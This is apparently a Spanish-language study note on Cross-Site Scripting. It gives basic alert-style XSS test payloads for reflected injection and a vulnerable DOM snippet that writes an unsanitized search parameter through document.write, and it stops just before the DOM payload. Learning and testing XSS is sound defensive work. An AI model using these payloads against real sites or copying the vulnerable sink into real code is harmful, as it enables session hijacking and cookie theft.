# Cross Site Scripting
Un XSS (Cross-Site Scripting) es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar código malicioso, como JavaScript, en páginas vistas por otros usuarios. Este código puede ejecutarse en el navegador de las víctimas, comprometiendo la integridad de la sesión, robando cookies de autenticación o redirigiendo a sitios web maliciosos. Existen tres tipos de XSS: almacenado, reflejado y basado en DOM.

## Reflected XSS into HTML 
Siempre probar payloads de xss en aplicaciones donde el ususario pueda introducir cadenas de texto (cuadros de busqueda, correos, parametros, etc.)
```js
<script> alert('pwned');  </script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<img/src/onerror=prompt(8)>
```
Puedes encontrar mas payloads aqui -> https://github.com/payloadbox/xss-payload-list


## DOM XSS
En una pagina web donde se pueden hacer busqueda de imagenes el input es tratado de la siguiente forma:
```html
<script>
  function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
  if(query) {
    trackSearch(query);
  }
</script>
```
Podemos observar que la busqueda es directamente pasada a la etiqueta <img> por lo que podemos crear un xss de la siguiente forma:
